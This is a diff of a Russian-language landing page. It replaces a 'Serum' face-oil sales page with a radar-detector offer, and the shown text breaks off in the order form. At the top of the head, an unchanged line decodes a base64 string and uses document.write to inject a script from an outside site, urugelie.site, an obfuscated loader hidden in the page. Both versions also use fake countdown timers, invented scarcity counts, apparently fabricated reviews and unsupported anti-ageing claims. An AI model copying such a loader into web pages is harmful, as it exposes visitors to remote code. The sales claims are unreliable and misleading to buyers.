@@ -1,555 +1,337 @@
 <!DOCTYPE html>
 <html lang="ru">
-   <head> <style>body{display:none}</style>
-                        <style>.FOOTER_INFO{display:block;-webkit-user-select:none!important;user-select:none!important;}.FOOTER_INFO:empty{display:none!important}</style>
-						<script>
+<head>
+	<script>
       var string = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8vdXJ1Z2VsaWUuc2l0ZS90cmFja2VyLmpzIj48L3NjcmlwdD4=';
       var decodedString = atob(string);
       document.write(''+ decodedString +'');
-</script>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
-                        <script>document.addEventListener('DOMContentLoaded', function(){var item = document.getElementsByTagName('body')[0]; item.style.display = 'block';});</script>
-                        <script src='https://code.jquery.com/jquery-3.2.1.min.js'></script>
-                        <link rel='stylesheet' href='widgets/hReset.css'>
-      <meta charset="utf-8">
-      <title>Serum</title>
-      <meta name="keywords" content="">
-      <meta name="description" content="">
-      <meta name='viewport' content='width=device-width'/>
-      <meta content="true" name="HandheldFriendly">
-      <meta content="width" name="MobileOptimized">
-      <meta content="yes" name="apple-mobile-web-app-capable">
-      <link rel="shortcut icon" type="image/png" href="img/favicon.png"/>
-      <link href="css/style.css" rel="stylesheet">
-
-
-   <script>
-                $(function(){
-window.curent_country='<?php echo $code ?>';
-addCountry({"KZ":"\u041a\u0430\u0437\u0430\u0445\u0441\u0442\u0430\u043d","UZ":"\u0423\u0437\u0431\u0435\u043a\u0438\u0441\u0442\u0430\u043d"}, '<?php echo $code ?>' );
-})
-
-                </script>
-				
-				<!-- Yandex.Metrika counter -->
-<script type="text/javascript" >
-   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
-   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
-   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
-
-   ym(65396212, "init", {
-        clickmap:true,
-        trackLinks:true,
-        accurateTrackBounce:true,
-        webvisor:true
-   });
-</script>
-<noscript><div><img src="https://mc.yandex.ru/watch/65396212" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
-<!-- /Yandex.Metrika counter -->
+	</script>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width">
+    <title>РАДАР-ДЕТЕКТОР </title>
+    <meta name="description" content="">
+    <link rel="stylesheet" href='files/reset-f99-arb.css'>
+    <link rel="stylesheet" href='files/Montserrat-526-arb.css' type="text/css">
+    <link rel="stylesheet" href='files/settings-d4f-arb.css'>
+    <link rel="stylesheet" href='files/slick-a70-arb.css'>
+    <link rel="stylesheet" href='files/style-962-arb.css'>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
 </head>
-   <body class="pluginLeave">
-      <div class="shadow__wrapper"></div>
-      <div class="wrapper">
-         <header class="header">
-            <div class="inner">
-               <div class="top-line">
-<!--                   <a href="#">Как<br> работает</a> -->
-                  <a href="#">Как<br> пользоваться</a>
-                  <a href="#">Отзывы<br> клиентов</a>
-                  <a href="#">Вопрос -<br> ответ</a>
-                  <a class="btn" href="#">Заказать</a>
-               </div>
-               <div class="main-block">
-                  <div class="main-block__top">
-                     <p class="main-block__name">Serum</p>
-                     <p class="main-block__desc">Мультикомплекс <span>№1</span><br> для лица</p>
-                     <p class="main-block__post">Профессиональное средство для глубокого очищения Вашего лица.</p>
-                     <p class="main-block__post">Быстро и надолго избавит от всех признаков старения кожи</p>
-                  </div>
-                  <form method="GET" action="call.html" class="form orderFormWrapper">
-                     <div class="form__block">
-                        <div class="form__row">
-                           <div class="form__left">
-                              <p class="form__title">Оформите заказ прямо сейчас</p>
-                              <p class="form__desc">Заполните форму и наши менеджеры перезвонят вам в ближайшее время</p>
-                           </div>
-                           <div class="form__right">
-                              <div class="timer">
-                                 <p class="hours"></p>
-                                 <p class="mins"></p>
-                                 <p class="secs"></p>
-                              </div>
-                              <p class="timer__until">До конца акции</p>
-                           </div>
-                        </div>
-
-                        <div class="form__row">
-                           <div class="form__left form__inputsBlock">
-                              <div class="input-block">
-                                 <input type="text" name="name" placeholder="Ваше имя">
-                              </div>
-                              <div class="input-block">
-                                 <input type="text" name="phone" placeholder="Ваш телефон">
-                              </div>
-                              <div class="input-block">
-                                 <select name="country" class="orderFormWrapperCountry"></select>
-                              </div>
-                           </div>
-                           <div class="form__right">
-                              <button type="submit" class="btn">ЗАКАЗАТЬ ЗА &nbsp;<span class="displayCurrentPrice">5&nbsp;₸ *</span></button>
-                           </div>
-                           <p class="notify">* При заказе полного курса</p>
-                        </div>
-                     </div>
-                  <script>$(document).ready(function(){$(".orderFormWrapperCountry").change(function(){$(".zprce").val(window.allPrices[$(this).val()].cost);});});</script><input type="hidden" class="zprce" name="price" value="0"></form>
-                  <div class="form__post">
-                     Товаров по акции “Супер-цена” осталось: <span><span class="lastpack">60</span> шт.</span>
-                  </div>
-               </div>
+<body>
+    <section class="block1">
+        <div class="wrap">
+            <h1 class="tlt">РАДАР-ДЕТЕКТОР <span>SHO-ME G-1000</span></h1>
+            <h2 class="subtlt">Ваш помощник <span>в дороге!</span></h2>
+            <div class="sale">акция <p>-53%</p> скидка</div>
+            <ul class="topplus">
+                <li>
+                    <p>Передовые технологии </p>
+                </li>
+                <li>
+                    <p>Встроенный GPS модуль</p>
+                </li>
+                <li>
+                    <p>Голосовые сообщения</p>
+                </li>
+                <li>
+                    <p>Высококонтрастный OLED дисплей</p>
+                </li>
+            </ul>
+            <div class="blockbox clearfix">
+                <div class="countbox">
+                    <div class="countbox-num">
+                        <div class="countbox-hours"><span></span>00</div>
+                        <div class="countbox-hours-text">Часов</div>
+                    </div>
+                    <div class="countbox-num">
+                        <div class="countbox-mins"><span></span>33</div>
+                        <div class="countbox-mins-text">Минут</div>
+                    </div>
+                    <div class="countbox-num">
+                        <div class="countbox-secs"><span></span>44</div>
+                        <div class="countbox-secs-text">Секунд</div>
+                    </div>
+                </div>
+                <div class="price clearfix">
+                    <div class="old-cost">
+                        <span>обычная цена:</span>
+                        <p><x-oldprice class="al-cost-promo">4250р</x-oldprice> </p>
+                    </div>
+                    <div class="new-cost">
+                        <span>цена по акции:</span>
+                        <p><x-newprice class="al-cost">1990р</x-newprice> </p>
+                    </div>
+                </div>
+                <a href="#order_form" class="button-m">Оформить заказ</a>
             </div>
-         </header>
-
-<!--          <section class="slider1">
-            <div class="inner">
-               <div class="slider__block">
-                  <div class="slider__block-left owl-carousel">
-                     <div class="slider__block-left-slide">
-                        <img src="img/sl1.jpg" alt="">
-                     </div>
-                     <div class="slider__block-left-slide">
-                        <img src="img/sl1.jpg" alt="">
-                     </div>
-                     <div class="slider__block-left-slide">
-                        <img src="img/sl1.jpg" alt="">
-                     </div>
-                  </div>
-                  <div class="slider__block-right">
-                     <p class="slider__block-right-title">Курс</p>
-                     <p class="slider__block-right-p">3 маски</p>
-                     <p class="slider__block-right-p">Экономия 99%</p>
-                     <p class="slider__block-right-p">Доставка до двери</p>
-                     <div class="input-block">
-                        <a href="#" >Заказать</a>
-                     </div>
-                     <a class="consult" href="#">Получить консультацию</a>
-                  </div>
-               </div>
+        </div>
+    </section>
+    <section class="block2">
+        <div class="wrap">
+            <div class="video-container shadow">
+                <div class="youtube" id="tjTLaUgQ_EQ"></div>
             </div>
-         </section> -->
-
-         <section class="slider2">
-            <div class="inner">
-               <div class="slider__block">
-                  <div class="slider__block-left">
-                     <div class="slider__block-left-slide">
-                        <img src="img/sl2.jpg" alt="">
-                     </div>
-                  </div>
-                  <div class="slider__block-right">
-                     <div class="slider__block-ti">Преимущества Serum</div>
-                     <div class="slider__block-bg">Serum</div>
-                        <a href="#" class="btn">Заказать</a>
-
-<p class="slider__block-right-title">Подходит всем</p>
-                     <p class="slider__block-right-p">Содержит только сертифицированные
-органические <a href="#">компоненты</a>
-растительного происхождения</p>
-<p class="slider__block-right-p"><a class="consult" href="#">Получить консультацию</a></p>
-                  </div>
-               </div>
+        </div>
+    </section>
+    <section class="block3">
+        <div class="wrap nopad">
+            <h2 class="title"><span class="green">SHO-ME G-1000 SIGNATURE </span>РАДАР ДЕТЕКТОР С GPS</h2>
+        </div>
+        <div class="wrap nopad">
+            <div class="bright">
+                <div class="wrap-slider">
+                    <img src='files/1-704-arb.jpg' alt="">
+                    <img src='files/2-f2c-arb.jpg' alt="">
+                    <img src='files/3-e09-arb.jpg' alt="">
+                    <img src='files/4-c37-arb.jpg' alt="">
+                </div>
             </div>
-         </section>
-
-
-         <section class="problem">
-            <div class="inner">
-               <p class="problem__title">Проблемная кожа?</p>
-               <p class="problem__titleSmall">Вам знакомы эти проблемы?</p>
-               <div class="problem__smallBlock">
-                  <div class="problem__smallBlock-items">
-                     <div class="problem__smallBlock-item">
-                        <p>— мимические морщины</p>
-                        <p>— старение кожи</p>
-                        <p>— угри, черные точки</p>
-                     </div>
-
-                     <div class="problem__smallBlock-item">
-                        <p>— Сухость, шелушение</p>
-                        <p>— высыпания, покраснения</p>
-                        <p>— прыщи</p>
-                     </div>
-                  </div>
-
-                  <div class="problem__smallBlock-items problem__smallBlock-items2">
-                     <div class="problem__smallBlock-item">
-                        90
-                     </div>
-                     <div class="problem__smallBlock-item">
-                        90 дней
-требуется для
-удаления 100%
-мимических
-морщин
-                     </div>
-                  </div>
-
-                  <div class="problem__smallBlock-text">Мультикомплекс экстраординарных масел СЕРУМ — это инновационная антивозрастная программа, разработанная американскими косметологами для решения проблем кожи в зависимости от её индивидуальных потребностей.</div>
-<div class="problem__smallBlock-subTitle">Коломейцева анастасия</div>
-<div class="problem__smallBlock-subTitle-text">Ведущий косметолог института</div>
-<div class="problem__smallBlockSub"></div>
-               </div>
+            <div class="wrap-text">
+                <p>Анализируя сигналы, поступающие в SHO-ME G-1000 SIGNATURE посредством определения уникальных
+                    характеристик каждого сигнала, радар детектор способен идентифицировать радар по его сигналу и
+                    соответственно оповестить пользователя о типе излучаемого сигнала с комплексов СТРЕЛКА, РОБОТ,
+                    КОРДОН, КРИС, ИСКРА или КРЕЧЕТ.</p>
+                <p>Вместе с устройством пользователь получает только то, что потребуется для установки антирадара в
+                    машине: есть крепление на лобовое стекло и липучки, кабель miniUSB, адаптер питания. В комплекте
+                    нашлось место и для инструкции, однако даже без нее интуитивно понятно, как начать работу.</p>
+                <p>Корпус изготовлен из надежного пластика с прорезиненным покрытием. Гаджет отличается небольшими
+                    размерами и весом, благодаря чему аппарат легко устанавливается и не закрывает обзор.</p>
             </div>
-         </section>
-
-
-
-
-
-
-
-         <section class="sostav" id="sostav">
-            <div class="inner">
-               <div class="sostav__block1">
-                  <div class="sostav__title">Что входит в состав?</div>
-                  <div class="sstitle">ЖОЖОБА</div>
-                  <div class="sostav__text">
-                     Масло вечнозелёного кустарника крайне эффективно при дряблой и стареющей коже. Благодаря действию витамина Е, оно делает её гладкой и бархатистой, придавая упругость, эластичность и подтянутость.
-                  </div>
-
-                  <div class="sostav__text">
-                     Кроме того, масло жожоба обладает превосходными омолаживающими свойствами, интенсивно питает кожу и придаёт ей здоровый вид.
-                  </div>
-               </div>
-
-               <div class="sostav__block2">
-                  <div class="sostav__aside">
-                     
-                     <div class="sostav__item">
-                        <div class="sostav__num">2</div>
-                        <div class="sstitle">БРАЗИЛЬСКИЙ ОРЕХ</div>
-                        <div class="sstext">
-                           <p>борется с воспалительными процессами</p>
-                           <p>содержит селен</p>
-                           <p>выводит токсины</p>
-                        </div>
-                     </div>
-
-                     <div class="sostav__item">
-                        <div class="sostav__num">3</div>
-                        <div class="sstitle">КУКУЙ</div>
-                        <div class="sstext">
-                           <p>Содержит полезнейшие кислоты, незаменимые для функционирования кожи: олеиновую, альфа-линоленовую и линолевую. Создавая особую защитную плёнку на коже, они помогают сделать её более увлажнённой и здоровой.</p>
-                        </div>
-                     </div>
-
-                     <div class="sostav__item">
-                        <div class="sostav__num">4</div>
-                        <div class="sstitle">АЛОЭ</div>
-                        <div class="sstext">
-                           <p>Помогает коже вырабатывать коллаген и эластин, необходимый для поддержания молодости, ускоряет регенерацию клеток и разглаживает морщины.</p>
-                        </div>
-                     </div>
-
-                     <div class="sostav__item">
-                        <div class="sostav__num">5</div>
-                        <div class="sstitle">ВИНОГРАДНЫЕ КОСТОЧКИ</div>
-                        <div class="sstext">
-                           <p>Маски для лица из виноградных косточек купируют вредное воздействие ультрафиолета, защищают эпидермис от влияния декоративной косметики, сужают поры и нормализуют процессы выделения кожного сала.</p>
-                        </div>
-                     </div>
-                  </div>
-
-                  <div class="sostav__aside">
-                     <div class="sostav__vita">
-                        <p></p>
-                        <p>Соки растений, которые входят в состав, творят чудеса</p>
-                     </div>
-                     <div class="sostav__item as1a">
-                        <div class="sostav__num">6</div>
-                        <div class="sstitle">провитамин в5</div>
-                        <div class="sstext">
-                           <p>Успокаивает и смягчает кожу, улучшает
-углеводный и жировой обмен</p>
-                        </div>
-                     </div>
-
-                     <div class="sostav__item as2a">
-                        <div class="sostav__num">7</div>
-                        <div class="sstitle">КЕДРОВАЯ ЖИВИЦА</div>
-                        <div class="sstext">
-                           <p>Является достойной заменой дорогостоящим омолаживающим процедурам и прекрасно справляется с мимическими и возрастными морщинами, пигментными пятнами, шелушением и угревой сыпью. Содержит живица и терпентин — уникальное вещество, обладающее мощными бактерицидными, ранозаживляющими и противовоспалительными свойствами.</p>
-                        </div>
-                     </div>
-
-  <!--                    <div class="sostav__item as3a">
-                        <div class="sostav__num">8</div>
-                        <div class="sstitle">витамин Е</div>
-                        <div class="sstext">
-                           <p>Проявляет антиоксидантный эффект
-и участвует в важнейших процессах
-клеточного метаболизма</p>
-                        </div>
-                     </div> -->
-                  </div>
-               </div>
+        </div>
+        <div class="wrap nopad">
+            <ul class="gif">
+                <li>
+                    <img src='files/Photo5-e37-arb.jpg' alt="">
+                </li>
+                <li>
+                    <img src='files/Photo6-f9e-arb.jpg' alt="">
+                </li>
+            </ul>
+            <ul class="result">
+                <li><img src='files/Photo7-aeb-arb.jpg' alt=""></li>
+                <li><img src='files/Photo8-9b6-arb.png' alt=""></li>
+                <li><img src='files/Photo9-db6-arb.png' alt=""></li>
+            </ul>
+        </div>
+    </section>
+    <section class="block4">
+        <div class="wrap nopad">
+            <h2 class="title">Преимущества <span class="green">SHO-ME G-1000 SIGNATURE</span></h2>
+            <ul class="safe">
+                <li><img src='files/Photo10-2f0-arb.png' alt="">
+                    <p>База радаров и камер по всей России и странам СНГ</p>
+                </li>
+                <li><img src='files/Photo11-378-arb.png' alt="">
+                    <p>Детектирование всех комплексов замера скорости радарной частью устройства и по базе GPS</p>
+                </li>
+                <li><img src='files/Photo12-134-arb.png' alt="">
+                    <p>Встроенный GPS модуль с высокой точностью определения координат</p>
+                </li>
+                <li><img src='files/Photo13-5be-arb.png' alt="">
+                    <p>Отключение частотных диапазонов (Х,К,Ka) по выбору пользователя</p>
+                </li>
+            </ul>
+        </div>
+    </section>
+    <section class="block6">
+        <div class="wrap">
+            <div class="blockbox clearfix">
+                <div class="countbox">
+                    <div class="countbox-num">
+                        <div class="countbox-hours"><span></span>00</div>
+                        <div class="countbox-hours-text">Часов</div>
+                    </div>
+                    <div class="countbox-num">
+                        <div class="countbox-mins"><span></span>33</div>
+                        <div class="countbox-mins-text">Минут</div>
+                    </div>
+                    <div class="countbox-num">
+                        <div class="countbox-secs"><span></span>44</div>
+                        <div class="countbox-secs-text">Секунд</div>
+                    </div>
+                </div>
+                <div class="price clearfix">
+                    <div class="old-cost">
+                        <span>обычная цена:</span>
+                        <p><x-oldprice class="al-cost-promo">4250р</x-oldprice> </p>
+                    </div>
+                    <div class="new-cost">
+                        <span>цена по акции:</span>
+                        <p><x-newprice class="al-cost">1990р</x-newprice> </p>
+                    </div>
+                </div>
+                <a href="#order_form" class="button-m">Оформить заказ</a>
             </div>
-         </section>
-
-
-
-
-
-         <section class="hurry">
-            <div class="inner">
-               <div class="sstitle">успейте купить</div>
-               <div class="hurry__title">Serum</div>
-               <div class="sstitle">по сниженной цене</div>
-               <div class="hurry__product">
-                  <div class="hurry__product-discount">-50%</div>
-                  <img src="img/hurry-product.png" alt="">
-               </div>
-               <div class="sstitle">Одной упаковки хватает на 3 процедуры по омоложению кожи</div>
-               <div class="hurry__prb">
-                  <p class="displayPrevPriceNoCyr">9900</p>
-                  <p class="displayCurrentPrice">5&nbsp;₸ *</p>
-               </div>
-
-               <div class="hurry__buttons">
-                  <a href="#" class="btn">Заказать Серум</a>
-                  <div class="input-block">
-                     <a href="#" class="btn">Нужна консультация</a>
-                     <p>*Специалист перезвонит через 2 минуты</p>
-                  </div>
-               </div>
+        </div>
+    </section>
+    <section class="block7">
+        <div class="wrap nopad">
+            <h2 class="title"><span class="green">Характеристики SHO-ME G-1000 SIGNATURE</span></h2>
+            <div class="wrap-chars">
+                <h3>Канал приема сигналов радара</h3>
+                <p><b>Тип приема: </b>Супергетеродинный с двойным преобразованием частоты</p>
+                <p><b>Тип Антены:</b> Линейно поляризованная, рупорная</p>
+                <p><b>Типа детектора:</b>Частотный дискриминатор</p>
             </div>
-         </section>
-
-
-
-
-
-
-
-         <section class="use" id="use">
-            <div class="inner">
-               <div class="use__block">
-                  <div class="use__title">Как пользоваться?</div>
-                  <div class="use__items">
-                     <div class="use__item">
-                        <div class="sstitle">1. Нанести</div>
-                        <div class="sstext">при помощи пипетки на область лба,<br> щёк и подбородок </div>
-                     </div>
-                     <div class="use__item">
-                        <div class="sstitle">2. Распределить</div>
-                        <div class="sstext">массажными движениями и дать впитаться</div>
-                     </div>
-                     <div class="use__item">
-                        <div class="sstitle">3. Применять</div>
-                        <div class="sstext">утром и вечером, повторяя полный курс 3 раза в год</div>
-                     </div>
-                  </div>
-                  <div class="use__photos-block">
-                     <div class="use__item">
-                        <div class="use__item-num">04</div>
-                        <div class="sstitle">4. наслаждайтесь</div>
-                        <div class="sstext">Ваша кожа отдохнула, помолодела<br> и посвежела, наслаждайтесь эффектом</div>
-                     </div>
-                  </div>
-               </div>
+        </div>
+        <br>
+        <div class="wrap nopad">
+            <div class="wrap-chars">
+                <h3>Лазер</h3>
+                <p><b>Лазер:</b> Приемник импульсных лазерных сигналов</p>
+                <p><b>Длина волны: </b>00~1100nm, обнаружение в радиусе 360 ̊</p>
             </div>
-         </section>
-
-
-         <section class="reviews" id="reviews">
-            <div class="inner">
-               <div class="reviews__title">Serum</div>
-               <p class="sstitle">отзывы клиентов</p>
-               <div class="reviews__slider-wrapper">
-                  <p class="reviews__nav"></p>
-                  <div class="reviews__slider owl-carousel">
-                     <div class="reviews__slide">
-                        <div class="reviews__avaBlock">
-                           <img src="img/r1.png" alt="">
-                           <p><span>Галина Михайловна, </span><span>Рязань</span></p>
-                        </div>
-                        <div class="reviews__text">
-                           «Работа, стрессы, недосып, экология — кого винить в том, что к 40 годам из зеркала на тебя смотрит замученная жизнью женщина? Главное НЕ ОПУСКАТЬ руки, верить, что возраст — не приговор, а ещё не забывать ухаживать за собой. В этом смысле мне ПОМОГ Серум. Прошла два курса и собираюсь начать третий, как и рекомендовано. Лицо подтянулось, стало более свежим и упругим, морщинки мимические СОКРАТИЛИСЬ ВДВОЕ, а ещё практически ИСЧЕЗЛО пигментное пятно на подбородке. Настроена победить возрастные морщины если не полностью, то хотя бы частично.»
-                        </div>
-                        <div class="reviews__right">
-                           <p class="reviews__count">
-                              1 отзыв<br>
-                              из 12
-                           </p>
-                        </div>
-                     </div>
-
-                     <div class="reviews__slide">
-                        <div class="reviews__avaBlock">
-                           <img src="img/r2.png" alt="">
-                           <p><span>Алёна, </span><span>Омск</span></p>
-                        </div>
-                        <div class="reviews__text">
-                           «Морщин у меня немного, а вот кожа выглядит уставшей. Искала что-нибудь, что поможет улучшить цвет лица + подтянуть тургор. Выбор пал на Серум. После недели использования лицо посвежело. У масла приятный запах + натуральный состав. Применяю 2 раза в день, очень надеюсь, что и дальше все будет здорово!»
-                        </div>
-                        <div class="reviews__right">
-                           <p class="reviews__count">
-                              2 отзыв<br>
-                              из 12
-                           </p>
-                        </div>
-                     </div>
-
-                     <div class="reviews__slide">
-                        <div class="reviews__avaBlock">
-                           <img src="img/r3.png" alt="">
-                           <p><span>Слава, </span><span>Владивосток</span></p>
-                        </div>
-                        <div class="reviews__text">
-                           «Серум мне подарила подруга. Недели 2 он стоял на полке, пока мое уходовое не закончилось, а в магазин бежать было лень. Распаковала. Попробовала. И где я была раньше? Всего 3 недели — а лицо гладкое, как у младенца! Раздражения никакого (мы капризные, да), а аромат просто божественный!!! Девочки, это просто шок, только положительный! Не думала никогда раньше, что такое бывает!»
-                        </div>
-                        <div class="reviews__right">
-                           <p class="reviews__count">
-                              3 отзыв<br>
-                              из 12
-                           </p>
-                        </div>
-                     </div>
-
-                     <div class="reviews__slide">
-                        <div class="reviews__avaBlock">
-                           <img src="" alt="">
-                           <p><span>Марго, </span><span>Алматы</span></p>
-                        </div>
-                        <div class="reviews__text">
-                           «Раньше всегда пробовала только люксовую косметику, в «бабушкины» рецепты не верила. А потом случился небольшой финансовый кризис и пришлось искать что-то действенное, но уже недорогое))) Выбор пал на Серум. Не могу сказать о полном разглаживании морщин, так как времени прошло мало. Рекомендовать могу по трем пунктам: гипоаллергенность, натуральные компоненты, приятная цена))) На лице не чувствуется, впитывается достаточно быстро, я под макияж его использую. Через месяц отпишусь о результатах омоложения)))»
-                        </div>
-                        <div class="reviews__right">
-                           <p class="reviews__count">
-                              4 отзыв<br>
-                              из 12
-                           </p>
-                        </div>
-                     </div>
-
-                     <div class="reviews__slide">
-                        <div class="reviews__avaBlock">
-                           <img src="img/r5.png" alt="">
-                           <p><span>Таня, </span><span>Новостибирск</span></p>
-                        </div>
-                        <div class="reviews__text">
-                           «Не люблю тяжелые антивозрастные крема, которые на кожу ложатся, как цементная масса. Пользуюсь только сыворотками и концентратами. Серум сочетаю с другими уходовыми средствами: использую по мере запущенности ситуации. Нравится, что он быстро впитывается и кожу держит в тонусе. Наношу вокруг глаз, капельку на веко, немного на лоб и складки возле носа. Накопительного эффекта не заметила, но и ухудшения состояния после отмены (если неделю не использовать) тоже.»
-                        </div>
-                        <div class="reviews__right">
-                           <p class="reviews__count">
-                              5 отзыв<br>
-                              из 5
-                           </p>
-                        </div>
-                     </div>
-
-                  </div>
-               </div>
+        </div>
+        <br>
+        <div class="wrap nopad">
+            <div class="wrap-chars">
+                <h3>Диапазон частот</h3>
+                <p><b>Х-диапазон:</b> 10.525GHz (±50MHz)</p>
+                <p><b>K-диапазон:</b> 24.150GHz (±150MHz)</p>
+                <p><b>Расширенный Ка-диапазон:</b> 34.700GHz (±1300MHz)</p>
             </div>
-         </section>
-
-
-
-         <header class="header footer" id="zakaz">
-            <div class="inner">
-               <div class="main-block">
-                  <div class="main-block__top">
-                     <p class="main-block__name">Serum</p>
-                     <p class="main-block__desc">Не упустите свой<br> шанс стать моложе</p>
-                     <p class="main-block__post">Профессиональное средство для глубокого очищения Вашего лица.</p>
-                     <p class="main-block__post">Быстро и надолго избавит от всех признаков старения кожи</p>
-                  </div>
-                  <form method="GET" action="call.html" class="form orderFormWrapper">
-                     <div class="form__block">
-                        <div class="form__row">
-                           <div class="form__left">
-                              <p class="form__title">Оформите заказ прямо сейчас</p>
-                              <p class="form__desc">Заполните форму и наши менеджеры перезвонят вам в ближайшее время</p>
-                           </div>
-                           <div class="form__right">
-                              <div class="timer">
-                                 <p class="hours"></p>
-                                 <p class="mins"></p>
-                                 <p class="secs"></p>
-                              </div>
-                              <p class="timer__until">До конца акции</p>
-                           </div>
-                        </div>
-
-                        <div class="form__row">
-                           <div class="form__left form__inputsBlock">
-                              <div class="input-block">
-                                 <input type="text" name="name" placeholder="Ваше имя">
-                              </div>
-                              <div class="input-block">
-                                 <input type="text" name="phone" placeholder="Ваш телефон">
-                              </div>
-                              <div class="input-block">
-                                 <select name="country" class="orderFormWrapperCountry"></select>
-                              </div>
-                           </div>
-                           <div class="form__right">
-                              <button type="submit" class="btn">ЗАКАЗАТЬ ЗА &nbsp;<span class="displayCurrentPrice">5&nbsp;₸ *</span></button>
-                           </div>
-                           <p class="notify">* При заказе полного курса</p>
-                        </div>
-                     </div>
-                  <script>$(document).ready(function(){$(".orderFormWrapperCountry").change(function(){$(".zprce").val(window.allPrices[$(this).val()].cost);});});</script><input type="hidden" class="zprce" name="price" value="0"></form>
-                  <div class="form__post">
-                     Товаров по акции “Супер-цена” осталось: <span>57 шт.</span>
-                  </div>
-               </div>
+        </div>
+        <br>
+        <div class="wrap nopad">
+            <div class="wrap-chars">
+                <h3>Общие параметры</h3>
+                <p><b>Диапазон рабочих температур:</b> от -20 до 70 ̊C</p>
+                <p><b>Напряжение питания:</b> +12~15V DC, 210Ma</p>
+                <p><b>Размеры (Ш.Д.В.):</b> 70.4 x 108.8 x 29.6㎜</p>
+                <p><b>Вес:</b> 130 гр</p>
+                <p><b>Производство:</b> Южная Корея</p>
+                <p><b>Провод питания:</b> есть, с доп.слотом</p>
+                <p><b>Сигнатурный режим:</b> есть</p>
+                <p><b>Тип материнской платы:</b> Premium</p>
             </div>
-         </header>
-
-
-
-         <footer class="end">
-            <div class="inner">
-               <div class="end__block">
-                  <div class="end__top">
-                     <p>Serum</p>
-                     <!-- <p>mask</p> -->
-                  </div>
-                  <div class="end__bottom">
-                     <a href="#">Информация для покупателя</a>
-                     <!-- <a href="#">Политика конфиденциальности</a> -->
-<!--                      <a href="#">Как работает</a> -->
-                     <a href="#">Как пользоваться</a>
-                     <a href="#">Отзывы клиентов</a>
-                     <a href="#">Вопрос - ответ</a>
-                  </div>
-               </div>
+        </div>
+    </section>
+    <section class="block8">
+        <div class="wrap nopad">
+            <h2 class="title">Отзывы <span class="green">покупателей</span></h2>
+            <div class="reviews">
+                <div>
+                    <div class="rev">
+                        <img src='files/Photo14-928-arb.png' alt="">
+                        <div class="person clearfix">
+                            <p><b>Николай Красиков, </b> 48 лет</p>
+                        </div>
+                        <p>SHO-ME G-1000 Signature, меня полностью устраивает всем своим набором функциональных
+                            возможностей. Очень здорово вписывается в авто, приятный лаконичный внешний вид. Отличная и
+                            очень быстрая схематика, которая очень заблаговременно предупреждает о приближающихся
+                            всевозможных излучаемых и не излучаемых радарах (благодаря встроенному GPS-приемнику).</p>
+                    </div>
+                </div>
+                <div>
+                    <div class="rev">
+                        <img src='files/Photo15-f90-arb.png' alt="">
+                        <div class="person clearfix">
+                            <p><b>Юрий Пензев, </b> 36 лет</p>
+                        </div>
+                        <p>Прибор хороший как по цене, так и по качеству. Бесперебойная работа. Каждый день проезжаю по
+                            800 км и пользуюсь уже полгода. Хорошо отсеивает ложные срабатывания, что очень радует.
+                            Одним словом, приборчик - палочка выручалочка на дороге.</p>
+                    </div>
+                </div>
+                <div>
+                    <div class="rev">
+                        <img src='files/Photo16-13a-arb.png' alt="">
+                        <div class="person clearfix">
+                            <p><b>Сергей Иванков, </b>30 лет</p>
+                        </div>
+                        <p>Это превосходный радар-детектор! Если Вы хотите без лишней нервотрепки управлять своим
+                            автомобилем и быть в полной уверенности что Вас вовремя предупредят, то это устройство
+                            именно то, что Вам нужно! Отличный сервис, регулярное обновление баз данных и реальная
+                            экономия Ваших средств за счет отсутствия штрафов!</p>
+                    </div>
+                </div>
             </div>
-         </footer>
+        </div>
+    </section>
+    <section class="block9">
+        <div class="wrap nopad">
+            <h2 class="title">Как заказать <span class="green">SHO-ME G-1000 SIGNATURE?</span></h2>
+            <ul class="ship">
+                <li>
+                    <img src='files/Photo17-80a-arb.png' alt="">
+                    <div class="ship-right">
+                        <div><span>01</span> Заявка</div>
+                        <p>Заполните форму заказа на нашем сайте</p>
+                    </div>
+                </li>
+                <li>
+                    <img src='files/Photo18-101-arb.png' alt="">
+                    <div class="ship-right">
+                        <div><span>02</span> Подтверждение</div>
+                        <p>Дождитесь звонка оператора для подтверждения заказа</p>
+                    </div>
+                </li>
+                <li>
+                    <img src='files/Photo19-796-arb.png' alt="">
+                    <div class="ship-right">
+                        <div><span>03</span> Получение</div>
+                        <p>Оплатите товар при получении на почте</p>
+                    </div>
+                </li>
+            </ul>
+        </div>
+    </section>
+    <section class="block10">
+        <div class="wrap">
+            <h1 class="tlt">РАДАР-ДЕТЕКТОР <span>SHO-ME G-1000</span></h1>
+            <h2 class="subtlt">Ваш помощник <span>в дороге!</span></h2>
+            <div class="sale">акция <p>-53%</p> скидка</div>
+            <div class="formbox">
+                <div class="price clearfix">
+                    <div class="old-cost">
+                        <span>обычная цена:</span>
+                        <p><x-oldprice class="al-cost-promo">4250р</x-oldprice> </p>
+                    </div>
+                    <div class="new-cost">
+                        <span>цена по акции:</span>
+                        <p><x-newprice class="al-cost">1990р</x-newprice> </p>
+                    </div>
+                </div>
+                <div class="countbox">
+                    <div class="countbox-num">
+                        <div class="countbox-hours"><span></span>00</div>
+                        <div class="countbox-hours-text">Часов</div>
+                    </div>
+                    <div class="countbox-num">
+                        <div class="countbox-mins"><span></span>33</div>
+                        <div class="countbox-mins-text">Минут</div>
+                    </div>
+                    <div class="countbox-num">
+                        <div class="countbox-secs"><span></span>44</div>
+                        <div class="countbox-secs-text">Секунд</div>
+                    </div>
+                </div>
+                <form id="order_form" class="main-order-form my_form al-form" action='/order' method="post">
+                    <input class="field" name="name" required type="text" placeholder="Введите ваше имя">
+                    <input class="field" name="phone" required type="tel" placeholder="Введите ваш телефон">
+                    <button class="button-m">Оформить заказ</button>
+                <input type="hidden" name="l" value="24b91a9a4662ed6ef7fefc2679f4df1484581d76" />
